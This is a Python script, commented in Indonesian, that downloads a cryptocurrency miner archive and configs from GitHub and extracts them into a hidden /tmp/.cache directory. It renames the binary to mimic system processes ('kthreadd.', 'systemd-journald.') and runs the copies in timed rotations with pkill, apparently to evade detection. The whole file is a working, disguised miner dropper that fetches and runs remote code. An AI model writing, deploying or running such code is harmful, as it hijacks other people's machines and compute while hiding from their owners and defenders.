import os
import urllib.request
import tarfile
import shutil
import time
import subprocess

base_path = "/tmp/.cache"
binary_names = ["kthreadd.", "systemd-journald."]
config_links = [
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-04/refs/heads/main/1.ini",
    "https://raw.githubusercontent.com/ANTI-VIRAL/Ai-04/refs/heads/main/2.ini",
]
miner_url = "https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz"

def setup_folders():
    print("[Poppy] Setup folder dan download file...")
    os.makedirs(base_path, exist_ok=True)

    # Download dan extract miner
    archive_path = os.path.join(base_path, "cache.tar.gz")
    if not os.path.exists(os.path.join(base_path, "cache")):
        print("[Poppy] Downloading cache.tar.gz...")
        urllib.request.urlretrieve(miner_url, archive_path)

        print("[Poppy] Extracting miner...")
        with tarfile.open(archive_path, "r:gz") as tar:
            tar.extractall(base_path)

        os.remove(archive_path)

    # Siapkan 2 folder dan copy miner + config
    for i in range(2):
        folder = os.path.join(base_path, str(i + 1))
        os.makedirs(folder, exist_ok=True)

        bin_src = os.path.join(base_path, "cache")
        bin_dst = os.path.join(folder, binary_names[i])
        shutil.copy2(bin_src, bin_dst)
        os.chmod(bin_dst, 0o755)

        config_path = os.path.join(folder, "config.ini")
        if not os.path.exists(config_path):
            print(f"[Poppy] Downloading config {i+1}...")
            urllib.request.urlretrieve(config_links[i], config_path)

    # Hapus file bin utama setelah copy
    try:
        os.remove(os.path.join(base_path, "cache"))
    except FileNotFoundError:
        pass

def run_rotasi():
    print("[Poppy] Mulai rotasi kerja panen...")
    max_loop = 10
    run_duration = 20 * 60
    rest_duration = 2 * 60
    long_rest = 5 * 60

    folder_index = 0

    while True:
        for loop in range(max_loop):
            folder = os.path.join(base_path, str(folder_index + 1))
            binary = os.path.join(folder, binary_names[folder_index])

            print(f"[Poppy] [{loop+1}/{max_loop}] Menjalankan: {binary}")
            proc = subprocess.Popen(binary, cwd=folder)

            time.sleep(run_duration)

            # Kill proses berdasarkan nama binary
            print("[Poppy] Menghentikan proses...")
            subprocess.run(f"pkill -f {binary_names[folder_index]}", shell=True)
            time.sleep(rest_duration)

            # Ganti ke folder selanjutnya
            folder_index = (folder_index + 1) % 2

        print("[Poppy] Long rest 10 menit...")
        subprocess.run("pkill -f kthreadd.", shell=True)
        subprocess.run("pkill -f systemd-journald.", shell=True)
        time.sleep(long_rest)

# Jalankan semua
setup_folders()
run_rotasi()
